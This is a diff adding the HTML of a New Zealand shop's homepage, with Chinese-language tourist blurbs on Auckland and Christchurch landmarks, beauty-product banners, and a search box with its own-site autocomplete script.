+                        <div class="popover-inner">
+                          <h3 class="popover-title">皇后大街</h3>
+                          <div class="popover-content">
+                            <p>皇后大街是奥克兰传统的主要街道或“黄金地段”，是奥克兰最著名的、最古老的和最繁华的街道，它汇集了市内所有购物商店及大型百货公司。这里的商品，琳琅满目，令人目不暇接。除了购物，这里也是品味奥克兰的现代与古典交相辉映的最佳选择。</p>
+                          </div>
+                        </div>
+                      </div>
+
+                      <img title="Sky Tower" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon1" data-target="ad05-pop1"  /> 
+                      <img title="帆船之都" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon2" data-target="ad05-pop2"  /> 
+                      <img title="皇后大街" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon3" data-target="ad05-pop3"  /> 
+                      <img src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/ad05.jpg" alt="" class="largeimage" id="image5"> </div>
+                     
+                    </div>
+                    <!---- end of  banner05 --->
+                    </li>
+                    <li class="hero">
+                    <!---- banner06 --->
+                      <div style="text-align:center;clear:both">
+                     
+                    <div class="container" id="container6">
+                     
+                      <div class="popover left" data-easein="cardInLeft" data-easeout="cardOutLeft" id="ad06-pop1">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">中央公园</h3>
+                          <div class="popover-content">
+                            <p>在奥克兰中央公园里，有一个不算大的湖，里面生活了很多的活泼可爱的鸟类和禽类。人们会从家里带来面包喂它们，大家与这些小鸟融洽和谐的生活在一起，尤其是孩子们，他们在喂小鸟的时候是那么的快乐兴奋。</p>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="popover top" data-easein="cardInTop" data-easeout="cardOutTop" id="ad06-pop2">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">天然草原</h3>
+                          <div class="popover-content">
+                            <p>奥克兰牛羊幸福指数很高，有着地球上最天然的牧场，几乎四季都可以吃到最肥美的鲜嫩牧草。而大片大片的牧场草地农庄牛羊马鹿几乎就是奥克兰公路两边的风景特色之一。</p>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="popover right" data-easein="cardInRight" data-easeout="cardOutRight" id="ad06-pop3">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">Kiwi鸟</h3>
+                          <div class="popover-content">
+                            <p>珍稀Kiwi鸟落户奥克兰海岛，目前野外仅存1500只。图片中的这只小Kiwi鸟有了跟小岛同样的名字——Motutapu。</p>
+                          </div>
+                        </div>
+                      </div>
+
+                      <img title="中央公园" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon1" data-target="ad06-pop1"  /> 
+                      <img title="天然草原" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon2" data-target="ad06-pop2"  /> 
+                      <img title="Kiwi鸟" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon3" data-target="ad06-pop3"  /> 
+                      <img src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/ad06.jpg" alt="" class="largeimage" id="image6"> </div>
+                     
+                    </div>
+                    <!---- end of  banner06 --->
+                    </li>
+                    <li class="hero">
+                    <!---- banner07 --->
+                      <div style="text-align:center;clear:both">
+                     
+                    <div class="container" id="container7">
+                     
+                      <div class="popover bottom" data-easein="cardInBottom" data-easeout="cardOutBottom" id="ad07-pop1">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">圣帕特里克大教堂</h3>
+                          <div class="popover-content">
+                            <p>这座哥特式的建筑具有悠久的历史，据说是完全由比利时的白色大理石修建成，从教堂的正面望过去，还能看到sky tower，两座建筑交相辉映。</p>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="popover top" data-easein="cardInTop" data-easeout="cardOutTop" id="ad07-pop2">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">奥克兰博物馆</h3>
+                          <div class="popover-content">
+                            <p>奥克兰博物馆位于奥克兰公园内，是一座哥特式建筑，馆内有丰富的历史和民族文物藏品。</p>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="popover top" data-easein="cardInTop" data-easeout="cardOutTop" id="ad07-pop3">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">奥克兰艺术馆</h3>
+                          <div class="popover-content">
+                            <p>于1888年建造，是新西兰国内历史最悠久的美术馆，藏品最多的展览馆。本馆为文艺复兴风格的白色建筑，馆藏多达1万件以上，其中包括现代新西兰艺术作品及近代欧洲绘画，收集了大量的南洋艺术。</p>
+                          </div>
+                        </div>
+                      </div>
+                       <div class="popover left" data-easein="cardInLeft" data-easeout="cardOutLeft" id="ad07-pop4">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">毛利文化</h3>
+                          <div class="popover-content">
+                            <p>毛利人的文化绚丽多彩，体现在他们对传统艺术和当代艺术的追求之中。传统艺术包括：雕刻、编织、组舞（kapa haka）、讲演（whaikorero）和纹身术等在全国各地历久不衰。而毛利人的当代文化包括：艺术、电影、电视、诗歌、戏剧和嘻哈乐等。
+</p>
+                          </div>
+                        </div>
+                      </div>
+
+                      <img title="圣帕特里克大教堂" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon1" data-target="ad07-pop1"  /> 
+                      <img title="奥克兰博物馆" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon2" data-target="ad07-pop2"  /> 
+                      <img title="奥克兰艺术馆" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon3" data-target="ad07-pop3"  /> 
+                      <img title="毛利文化" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon4" data-target="ad07-pop4"  /> 
+                      <img src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/ad07.jpg" alt="" class="largeimage" id="image7"> </div>
+                     
+                    </div>
+                    <!---- end of  banner07 --->
+                    
+                    </li>
+                    <li class="hero">
+                   <!---- banner08 --->
+                      <div style="text-align:center;clear:both">
+                     
+                    <div class="container" id="container8">
+                     
+                      <div class="popover bottom" data-easein="cardInBottom" data-easeout="cardOutBottom" id="ad08-pop1">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">街上云霄</h3>
+                          <div class="popover-content">
+                            <p>想要看遍基督城这个花园般美丽的城市, 乘坐热气球是最好的一个选择. 即使您已经浏览过城市美景, 相信坐在竹编的热气球篮筐中, 从高空俯瞰基督城将能够真正领略这份美景. 带著你的香槟与酒杯, 与朋友在高空中享用, 毕生难忘.</p>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="popover right" data-easein="cardInRight" data-easeout="cardOutRight" id="ad08-pop2">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">花园之城</h3>
+                          <div class="popover-content">
+                            <p>基督城洁净的道路，浓浓的林荫，雅致的环境，醇厚的文化气息，让人迷醉。走在这古朴而又充满生机的城市中，游人可以看到清澈的小溪，可以听见小鸟的鸣唱，可以接受阳光、清风的抚慰，一切显得那么的自然、和谐。</p>
+                          </div>
+                        </div>
+                      </div>
+                     
+
+                      <img title="街上云霄" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon1" data-target="ad08-pop1"  /> 
+                      <img title="花园之城" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon2" data-target="ad08-pop2"  /> 
+
+                      <img src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/ad08.jpg" alt="" class="largeimage" id="image8"> </div>
+                     
+                    </div>
+                    <!---- end of  banner08 --->
+                    </li>
+                    <li class="hero">
+                   <!---- banner09 --->
+                      <div style="text-align:center;clear:both">
+                     
+                    <div class="container" id="container9">
+                     
+                      <div class="popover left" data-easein="cardInLeft" data-easeout="cardOutLeft" id="ad09-pop1">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">普尔特尼桥</h3>
+                          <div class="popover-content">
+                            <p>普尔特尼桥的周围环境幽雅，有许多18世纪乔治王时代的建筑散落在大桥两侧，伫立桥头，眺望雅芳河两岸风光，仿佛置身威尼斯水城一般。</p>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="popover left" data-easein="cardInLeft" data-easeout="cardOutLeft" id="ad09-pop2">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">雅芳河</h3>
+                          <div class="popover-content">
+                            <p>在基督城的市中心，有一条贯穿全城的河——雅芳河(Avon River)， 河岸两旁绿草如茵，植满了白杨，梧桐，垂柳等绿荫，加上错落其间的花坛，不难体会花木与此地人们的亲密关系与互相依存的情感。</p>
+                          </div>
+                        </div>
+                      </div>
+                       <div class="popover left" data-easein="cardInLeft" data-easeout="cardOutLeft" id="ad09-pop3">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">基督城大教堂</h3>
+                          <div class="popover-content">
+                            <p>教堂边上是一座高达63米的尖顶钟楼，在中段设有瞭望台。内部采用挑高设计，气氛庄严肃穆，内里漂亮的玫瑰花窗、饰有庄严圣像的无比华丽的巨大彩绘玻璃窗、带木制棱纹的天花板以及用独特的希腊十字纹章装饰的彩釉花砖，将教堂装点得美仑美奂。</p>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="popover top" data-easein="cardInTop" data-easeout="cardOutTop" id="ad09-pop4">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">1q6<br />
+
+                          <h3 class="popover-title">复古电车</h3>
+                          <div class="popover-content">
+                            <p>   亲身体验基督城最有趣并有历史教学价值的电车游览。游客只要轻轻松松的坐在电车上, 就可以观看基督城的知名景点，感受风情万种的基督城。另外你也可以在电车上享受最独特的浪漫烛光晚餐。在豪华的大餐和优美的环境下漫游基督城。</p>
+                          </div>
+                        </div>
+                      </div>
+
+                      <img title="普尔特尼桥" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon1" data-target="ad09-pop1"  /> 
+                      <img title="雅芳河" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon2" data-target="ad09-pop2"  /> 
+                      <img title="基督城大教堂" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon3" data-target="ad09-pop3"  /> 
+                      <img title="复古电车" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon4" data-target="ad09-pop4"  /> 
+                      <img src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/ad09.jpg" alt="" class="largeimage" id="image9"> </div>
+                     
+                    </div>
+                    <!---- end of  banner09 --->
+                    </li>
+                </ul>
+            </div>
+            <div class="helper">
+                <div class="mask-left">
+                </div>
+                <div class="mask-right">
+                </div>
+                <a href="javascript:void(0)" class="next icon-arrow-a-left"></a>
+                <a href="javascript:void(0)" class="prev icon-arrow-a-right"></a>
+            </div>
+        </div>
+    	</div>
+                 <!-- 图片滑动的开始 -->
+
+     	<div id="middle_contain2">
+		
+			<div class="mid-header">
+ 				<p>NATURE'S BEAUTY PRODUCT <span>自然美产品</span></p>
+			</div><!-- /ps-header -->
+            
+			<div id="other_banner">
+                <ul>
+                    <li>
+                    <div><a href="http://www.ctom.club/index.php/products/nature-s-beauty/bee-venom.html"><img class="ban" src="http://www.ctom.club/skin/frontend/default/ctom/images/Bee-Venom.jpg" alt="" /></a></div>
+                    </li> 
+                    <li>
+                    <div><a href="http://www.ctom.club/index.php/products/nature-s-beauty/bee-kiwi.html"><img  class="ban" src="http://www.ctom.club/skin/frontend/default/ctom/images/Bee-Kiwis.jpg" alt="" /></a></div>
+                    </li>
+                    <li>
+                    <div><a href="http://www.ctom.club/index.php/products/nature-s-beauty/ovine-placenta.html"><img class="ban" src="http://www.ctom.club/skin/frontend/default/ctom/images/Ovine-Placenta.jpg" alt="" /> </a></div>
+                    </li>
+                    <li>
+                    <div><a href="http://www.ctom.club/index.php/products/nature-s-beauty/lanolux.html"><img class="ban" src="http://www.ctom.club/skin/frontend/default/ctom/images/Lanolux.jpg" alt="" /> </a></div>
+                    </li>
+                    <li>
+                    <div><a href="http://www.ctom.club/index.php/products/nature-s-beauty/thermal-mud.html"><img class="ban" src="http://www.ctom.club/skin/frontend/default/ctom/images/Thermal-Mud.jpg" alt="" /> </a></div>
+                    </li>
+                </ul>
+            </div>
+		
+	</div>
+  <script type="text/javascript">// <![CDATA[
+var other_banner = new Hongru2.banner.init('other_banner',{
+	id:'other_banner'
+});
+// ]]></script>          <div class="column1">
+			<div class="info1">
+				<div data-zlname="test11" class="img_bg">
+					<a href="#">
+                    <img src="http://www.ctom.club/skin/frontend/default/ctom/images/about_us.png">
+					</a>
+				</div> 
+				<p>About Us <span> 关于我们</span></p>
+			</div>
+
+			<div class="info1" id="contact_us_bg">
+				<div data-zlname="test11" class="img_bg">
+					<a href="#">
+                    <img src="http://www.ctom.club/skin/frontend/default/ctom/images/contact_us.png">
+					</a>
+				</div>
+				<p>Contact Us <span> 联系我们</span></p>
+			</div>
+
+			<div class="info1">
+				<div data-zlname="test11" class="img_bg">
+					<a href="#">
+                    <img src="http://www.ctom.club/skin/frontend/default/ctom/images/brand_active.png">
+					</a>
+				</div>
+				<p>Brand Activities <span> 品牌活动</span></p>
+			</div>
+
+		</div>        </div>
+               
+        <div class="footer-container">    <div class="footer-widget">
+    <div class="footer-top">
+    	<div id="footer1">
+<ul>
+<ul>
+<li><a href="http://www.ctom.club/index.php/payment-methods">Payment Methods</a></li>
+<li><a href="http://www.ctom.club/index.php/shipping-delivery">Shipping and Delivery</a></li>
+<li><a href="http://www.ctom.club/index.php/faq">F.A.Q</a></li>
+<li><a href="http://www.ctom.club/index.php/terms-condition">Terms and Condition</a></li>
+<li class="last"><a href="http://www.ctom.club/index.php/privacy-statement">Privacy and Statement</a></li>
+</ul>
+</ul>
+<div class="clear">&nbsp;</div>
+</div>        <form id="search_mini_form" action="http://www.ctom.club/index.php/catalogsearch/result/" method="get">
+    <div class="form-search">
+        		<div class="" id="searchajaxico" style="display: none;"></div>
+        <input id="search" type="text" name="q" value="Search entire store here..." class="input-text" />
+        <button type="submit" title="Search" class="button"></button>
+        <div id="search_autocomplete" class="search-autocomplete" style="display:none;"></div>
+        
+				<script type="text/javascript">
+            //<![CDATA[
+			Event.observe('search','click',function(event){
+				if($('search').value == 'Search entire store here...')
+					$('search').value = '';
+			});
+			Event.observe('search','blur',function(event){
+				if($('search').value == '')
+					$('search').value = 'Search entire store here...';
+				 
+				if($('search_autocomplete').style.display != 'none')
+						setTimeout(function(){$('search_autocomplete').hide();}, 500);
+						//$('search_autocomplete').slideUp('.8');
+			});
+			
+			Event.observe('search', 'keyup', function(event){
+				if(event.keyCode == 8 || event.keyCode == 46){
+					if($('search').value.length < 3){
+						$('search_autocomplete').hide();
+					}
+				}
+
+				if( (event.keyCode >= 65 && event.keyCode <= 90) || (event.keyCode >= 96 && event.keyCode <= 105) || (event.keyCode >= 48 && event.keyCode <= 57) || event.keyCode == 32 ){
+					if($('search').value.length > 2){
+						new Ajax.Request('http://www.ctom.club/index.php/ajaxsearch/index/',
+						{
+							method:'get',
+							parameters: { 'q' : $('search').value },
+							onLoading: function(){
+								$('searchajaxico').show();
+							},
+							onSuccess: function(transport){
+							  var response = transport.responseText || "No product found";
+							  //alert("Success! \n\n" + response);
+							  $('searchajaxico').hide();
+							  $('search_autocomplete').update('');
+							  $('search_autocomplete').update(response);
+							  if(!$('search_autocomplete').visible())
+								$('search_autocomplete').slideDown('fast');
+							  
+							},
+							onFailure: function(){ alert('Something went wrong...') }
+						});
+					}
+					else{
+						$('search_autocomplete').hide();
+					}
+				}
+			});
+
+			function aasl()
+			{
+				//alert(flag);
+				}
+
+			function remainVisible()
+			{
+				//flag=1;
+				//alert("Is clck");
+				//$('search_autocomplete').show();
+			}
+            //]]>
+            </script>
+		    </div>
+</form>
+    </div>
+    <div class="footer-bottom">
+    	<div class="one-cols">
+        	<img src="http://www.ctom.club/skin/frontend/default/ctom/images/footer-logo.png"/>
+        </div>
+    	<div class="two-cols">
+            <p>（C）2014-2015 Ctom Ltd. All rights reserved.<br />
+            Ctom Head Office: 1-3 Paul Matthews Road, Rosedale, Auckland, New Zealand.<br />
+            Ph: +64 9 2000135    <br />                                    
+            Email: info@ctom.co.nz  
+            </p>
+    	</div>
+        <div class="three-cols">
+			<p>P.O. BOX: 303-400, North Harbour, Auckland 0751, New Zealand</p>
+        </div>
+        <div class="clear"></div>
+    </div>
+    <!--<div id="footer3">
+    <p>天然·纯净·新西兰</p>
+    <p>新西兰常青树原装进口品质保证</p>
+    <h3>Family's Health in Mind</h3>
+    <div class="block-subscribe">
+        <form action="http://www.ctom.club/index.php/newsletter/subscriber/new/" method="post" id="newsletter-validate-detail">
+                        <div class="input-box">
+               <input type="text" name="email" id="newsletter" title="Sign up for our newsletter" class="input-text required-entry validate-email" />
+               <button type="submit" title="Subscribe" class="button"></button>
+            </div>
+    </form>
+    <script type="text/javascript">
+    //<![CDATA[
+        var newsletterSubscriberFormDetail = new VarienForm('newsletter-validate-detail');
+    //]]>
+    </script>
+</div>
+    </div>-->
+    </div>
+    <div class="copyright">
+    <div>
+<address>Copyright Р’В© 2015. All Rights Reserved. Designed by Sainstore</address></div>
+</div>
+</div>
+            </div>
+</div>
+</body>
+</html>
